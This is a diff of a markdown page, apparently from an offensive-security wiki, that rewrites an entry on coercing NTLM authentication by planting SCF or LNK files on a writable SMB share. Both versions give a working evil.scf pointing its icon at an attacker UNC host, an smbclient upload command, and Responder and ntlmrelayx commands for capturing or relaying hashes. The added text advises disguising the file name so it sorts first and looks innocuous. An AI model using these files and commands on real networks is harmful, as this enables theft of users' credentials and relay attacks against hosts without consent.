@@ -1,43 +1,54 @@
 ---
-title: "SCF and LNK coercion: coercing authentication from a share"
-description: "Planting SCF, LNK, or URL and library files on a writable SMB share whose icon or resource loads from an attacker UNC path, so that merely browsing the folder in Explorer makes the viewer's machine authenticate to the attacker for NTLM capture or relay."
+title: "SCF and LNK coercion: forcing authentication when a folder is browsed"
+description: "SCF and LNK files placed on a writable share can reference an icon or target by UNC path on an attacker host. When a user merely browses the folder in Explorer, the client resolves those references and authenticates to the attacker, capturing the NTLM hash or feeding an NTLM relay, with no file opened or executed."
 keywords:
-  - SCF file
-  - LNK icon
-  - UNC coercion
-  - forced authentication
-  - NTLM capture
+  - scf file
+  - lnk file
+  - unc path
+  - responder
+  - ntlm coercion
 ---
 
 # SCF and LNK coercion
 
-Windows Explorer resolves icons and resources when it renders a folder. A crafted file that points its icon at a UNC path on the attacker's host makes any user who browses the folder authenticate to that host, leaking their NTLM. SCF (Shell Command File) worked on older Windows; LNK shortcuts with a UNC icon location, and `.url` and `.library-ms` files, are the current equivalents.
+The most reliable share-poisoning technique needs no file to be opened or run: it fires when a user simply views the folder. Explorer resolves certain file attributes to render a folder, and if those attributes point at a UNC path on an attacker host, the client connects and authenticates there. SCF (Shell Command File) and LNK (shortcut) files both carry an icon reference; a Windows library/search-connector or a desktop.ini can do the same. Dropping such a file in a writable share means any user who browses the directory authenticates to the attacker, whose capture or relay turns that into the victim's NTLM hash or a relayed session.
+
+## Plant the coercion file
 
 ```ini
-# evil.scf planted on the writable share (legacy)
+; evil.scf  -- Explorer resolves IconFile via UNC on folder view
 [Shell]
 Command=2
-IconFile=\\<attacker-ip>\share\x.ico
+IconFile=\\<attacker-ip>\share\icon.ico
 [Taskbar]
 Command=ToggleDesktop
 ```
 
 ```bash
-# Capture or relay the coerced authentication
-# Place the file on the writable share, then listen for the coerced auth
-smbclient //<target>/share -U user%pass -c 'put evil.scf'
-responder -I eth0
-# or relay it straight to another host
-ntlmrelayx.py -t smb://<other-target> -smb2support
+# drop it where users browse (name it to sort to the top, e.g. a leading ~ or @)
+smbclient //<t>/share -U 'user%pass' -c 'put evil.scf @readme.scf'
+# an LNK with a UNC icon path achieves the same; set the icon location to \\attacker\x
+# stand up capture/relay on the attacker host to receive the authentication:
+responder -I eth0                              # capture NTLMv2 for offline cracking
+impacket-ntlmrelayx -tf targets.txt -smb2support   # relay it to a signing-off host
 ```
+
+When Explorer renders the folder, it fetches the icon from the UNC path, which makes the client perform SMB authentication to the attacker; the attacker captures the NTLMv2 response (crack offline) or relays it live to another host.
 
 ## Exploitation notes
 
-- The user never clicks anything: rendering the folder triggers the icon fetch and the authentication.
-- SCF is blocked on modern Windows, so prefer `.lnk` with a UNC `IconLocation`, or `.url`/`.library-ms` files, which still coerce.
-- The captured NTLM is cracked offline or relayed; see [Signing and relay](../signing-and-relay.md).
+- The trigger is folder browsing, not opening a file, which makes this far more reliable than macro or executable techniques: anyone who navigates to the share in Explorer fires it.
+- The captured NTLMv2 is cracked offline if the password is weak, or relayed immediately to a host that does not require signing; pair with [signing and relay](../signing-and-relay.md).
+- SCF icon coercion has been curtailed on patched/modern Windows in some contexts, so keep LNK (UNC icon), library/`.library-ms`, and `desktop.ini` variants as alternatives; the mechanism (UNC resolution on render) is the same.
+- Name the file to sort first and look innocuous so it is rendered promptly; the credential captured is the browsing user's.
+
+## Tools
+
+- [Responder](https://github.com/lgandx/Responder)
+- [Impacket ntlmrelayx](https://github.com/fortra/impacket)
+- [ntlm_theft (coercion file generator)](https://github.com/Greenwolf/ntlm_theft)
 
 ## References
 
-- [The Hacker Recipes: forced authentication](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications)
-- [HackTricks: places to steal NTLM creds](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/printers-spooler-service-abuse.html)
+- [MITRE ATT&CK: forced authentication](https://attack.mitre.org/techniques/T1187/)
+- [MITRE ATT&CK: taint shared content](https://attack.mitre.org/techniques/T1080/)
